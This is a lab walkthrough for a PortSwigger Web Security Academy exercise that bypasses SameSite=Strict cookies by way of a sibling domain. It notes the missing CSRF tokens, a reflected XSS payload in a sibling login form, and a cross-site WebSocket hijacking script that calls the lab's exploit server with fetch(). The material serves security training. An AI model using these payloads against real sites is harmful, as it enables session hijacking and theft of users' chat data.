# Lab: SameSite Strict bypass via sibling domain
# https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-restrictions-via-vulnerable-sibling-domains/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain#
```bash
# Open live chat. Type some random strings into chat and reload the page.
# Check / GET request from burp.

Set-Cookie: session=8UOa0Y8aWdrmicz0bWgtP9gP4RBKvLYv; Secure; HttpOnly; SameSite=Strict

# Session cookie SameSite=Strict
```
```bash
# Check /chat GET request from burp.

# We see that there is no any unpredictable tokens so it is vulnerable to a csrf attack if we find a way to get around Same-Site limitation.

```

```bash
# Check /chat GET request with http from burp.

<form id="chatForm" action="wss://0aca008903fda52f817980dc00e6003a.web-security-academy.net/chat">

# Check chat.js file

Access-Control-Allow-Origin: https://cms-0aca008903fda52f817980dc00e6003a.web-security-academy.net

(function () {
    var chatForm = document.getElementById("chatForm");
    var messageBox = document.getElementById("message-box");
    var webSocket = openWebSocket();

    messageBox.addEventListener("keydown", function (e) {
        if (e.key === "Enter" && !e.shiftKey) {
            e.preventDefault();
            sendMessage(new FormData(chatForm));
            chatForm.reset();
        }
    });

# Contains an Access-Control-Allow-Origin header, which reveals a sibling domain

```

```bash
# Visit https://cms-0aca008903fda52f817980dc00e6003a.web-security-academy.net

username: a
password: a
Invalid username: a

# Try

username: <script>alert()</script>
password: a

# Reflected XSS.
```

```bash
# Send post /login to repeater and turn it to get request.
# It works so we can send it as get request.
# Recreate the CSWSH script that you tested on the exploit server earlier.

<script>
    var ws = new WebSocket('wss://0ae400aa046e098080ac8a0f00e700d0.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch("https://exploit-0a7900b604e2093880d3896601bd0029.exploit-server.net/exploit");
    };
</script>


``
